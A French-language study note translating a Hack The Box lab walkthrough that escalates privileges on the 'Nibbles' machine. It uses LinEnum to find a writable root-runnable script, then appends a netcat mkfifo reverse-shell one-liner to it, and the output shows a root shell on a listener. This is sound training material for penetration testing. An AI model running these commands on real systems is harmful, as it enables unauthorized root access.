---
tags:
  - getting-started
ordre: 18
---

# Nibbles - Élévation de privilèges

---

Maintenant que nous avons une connexion de reverse shell, il est temps d'élever nos privilèges. Nous pouvons décompresser le fichier `personal.zip` et voir un fichier nommé `monitor.sh`.

```bash
nibbler@Nibbles:/home/nibbler$ unzip personal.zip  unzip personal.zip Archive:  personal.zip    creating: personal/    creating: personal/stuff/   inflating: personal/stuff/monitor.sh
```

Le script shell `monitor.sh` est un script de surveillance, il appartient à notre utilisateur `nibbler` et est inscriptible.

```bash
nibbler@Nibbles:/home/nibbler/personal/stuff$ cat monitor.sh  cat monitor.sh                  ####################################################################################################                   #                                        Tecmint_monitor.sh                                        #                   # Written for Tecmint.com for the post www.tecmint.com/linux-server-health-monitoring-script/      #                   # If any bug, report us in the link below                                                          #                   # Free to use/edit/distribute the code below by                                                    #                   # giving proper credit to Tecmint.com and Author                                                   #                   #                                                                                                  #                   ####################################################################################################  #! /bin/bash  # unset any variable which system may be using  # clear the screen  clear  unset tecreset os architecture kernelrelease internalip externalip nameserver loadaverage  while getopts iv name do        case $name in          i)iopt=1;;          v)vopt=1;;          *)echo "Invalid arg";;        esac done   <SNIP>
```

Mettons cela de côté pour l'instant et téléchargeons [LinEnum.sh](https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh) pour effectuer quelques vérifications automatisées d'élévation de privilèges (privilege escalation). D'abord, téléchargez le script sur votre VM d'attaque locale ou sur la Pwnbox, puis démarrez un serveur HTTP `Python` avec la commande `sudo python3 -m http.server 8080`.

```bash
Hiterof13@htb[/htb]$ sudo python3 -m http.server 8080
[sudo] password for ben: ***********
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ... 10.129.42.190 - - [17/Dec/2020 02:16:51] "GET /LinEnum.sh HTTP/1.1" 200 -
```

De retour sur la cible, tapez `wget http://<votre_ip>:8080/LinEnum.sh` pour télécharger le script. En cas de succès, nous verrons une réponse de succès 200 sur notre serveur HTTP Python. Une fois le script transféré, tapez `chmod +x LinEnum.sh` pour le rendre exécutable, puis tapez `./LinEnum.sh` pour le lancer. Nous voyons une tonne d'informations intéressantes, mais ce qui attire immédiatement l'attention, ce sont les privilèges `sudo`.

```bash
[+] We can sudo without supplying a password! Matching Defaults entries for nibbler on Nibbles:     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin  User nibbler may run the following commands on Nibbles:     (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
[+] Possible sudo pwnage! /home/nibbler/personal/stuff/monitor.sh
```

L'utilisateur `nibbler` peut exécuter le fichier `/home/nibbler/personal/stuff/monitor.sh` avec les privilèges root. Étant donné que nous avons le contrôle total sur ce fichier, si nous ajoutons un one-liner de reverse shell à la fin de celui-ci et que nous l'exécutons avec `sudo`, nous devrions obtenir un reverse shell en tant qu'utilisateur root. Modifions le fichier `monitor.sh` pour y ajouter un one-liner de reverse shell.

```bash
nibbler@Nibbles:/home/nibbler/personal/stuff$ echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 8443 >/tmp/f'
| tee -a monitor.sh
```

Si nous affichons le contenu du fichier `monitor.sh` avec `cat`, nous verrons le contenu ajouté à la fin. `Il est crucial, si nous rencontrons une situation où nous pouvons exploiter un fichier inscriptible pour une élévation de privilèges, de ne faire qu'ajouter du contenu à la fin du fichier (après en avoir fait une copie de sauvegarde) pour éviter de l'écraser et de provoquer une interruption de service.` Exécutez le script avec `sudo` :

```bash
nibbler@Nibbles:/home/nibbler/personal/stuff$ sudo /home/nibbler/personal/stuff/monitor.sh
```

Enfin, réceptionnez le shell root sur notre écouteur `nc` en attente.

```bash
Hiterof13@htb[/htb]]$ nc -lvnp 8443  listening on [any] 8443 ... connect to [10.10.14.2] from (UNKNOWN) [10.129.42.190] 47488 # id
uid=0(root) gid=0(root) groups=0(root)
```

À partir de là, nous pouvons récupérer le flag `root.txt`. Nous avons maintenant résolu notre première box sur HTB. Essayez de reproduire toutes les étapes par vous-même. Essayez différents outils pour obtenir le même résultat. Nous pouvons utiliser de nombreux outils différents pour les diverses étapes requises pour résoudre cette box. Cette procédure pas à pas montre une méthode possible. Assurez-vous de prendre des notes détaillées pour pratiquer cette compétence essentielle.
---

← [[17 - Nibbles - Prise de contrôle initiale]] | [[00 - Sommaire Getting Started|Sommaire]] | [[19 - Nibbles - Méthode alternative pour l'utilisateur - Metasploit]] →
